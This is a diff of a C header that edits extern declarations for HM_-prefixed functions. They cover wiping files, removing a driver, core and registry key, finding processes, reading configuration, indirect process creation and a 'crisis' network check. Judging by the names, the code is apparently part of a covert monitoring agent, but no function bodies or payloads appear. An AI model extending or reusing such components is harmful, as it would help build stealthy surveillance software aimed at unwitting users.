@@ -25,9 +25,10 @@ extern WCHAR *HM_CompletePathW(WCHAR *, WCHAR *);
 extern void HM_WipeFileA(char *);
 extern void HM_WipeFileW(WCHAR *);
 extern void HM_RemoveRegistryKey(void);
-extern void HM_RemoveDriver(void);
+extern void HM_RemoveDriver();
 extern void HM_RemoveCore(void);
 extern BOOL HM_GetDefaultBrowser(char *);
+extern BOOL HM_GetIE32Browser(char *path_name);
 extern void HM_U2A(char *);
 extern void HM_A2U(char *src, char *dst);
 extern char *HM_memstr(char *, char *);
@@ -35,18 +36,22 @@ extern char *HM_FindProc(DWORD);
 extern WCHAR *HM_FindProcW(DWORD);
 extern DWORD HM_FindPid(char *, BOOL);
 extern HWND HM_GetProcessWindow(char *procname);
-extern BOOL HM_CheckNewConf(void);
+extern BOOL HM_CheckNewConf(char *);
 extern BOOL HM_GetDate(nanosec_time *);
-extern BYTE *HM_ReadClearConf(char *);
+extern char *HM_ReadClearConf(char *);
 extern BOOL HM_ExpandStrings(char *source, char *dest, DWORD dsize);
 extern BOOL HM_ExpandStringsW(WCHAR *source, WCHAR *dest, DWORD dsize);
 extern BOOL GetUserUniqueHash(BYTE *user_hash, DWORD hash_size);
 extern void IndirectCreateProcess(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INFORMATION *pi);
 extern void HM_CalcDateDelta(long long, nanosec_time *);
 extern void *memmem (const void *haystack, size_t haystack_len, const void *needle, size_t needle_len);
+extern BOOL HM_TimeStringToFileTime(const WCHAR *time_string, FILETIME *ftime);
+extern BOOL IsLastInstance();
+extern BOOL HM_HourStringToMillisecond(const WCHAR *time_string, DWORD *millisecond);
 
 BOOL FindModulePath(char *, DWORD);
 char *GetDosAsciiName(WCHAR *orig_path);
+
 
 // Dichiarata in HM_CrisisAgent.h 
 extern BOOL IsCrisisNetwork(void);
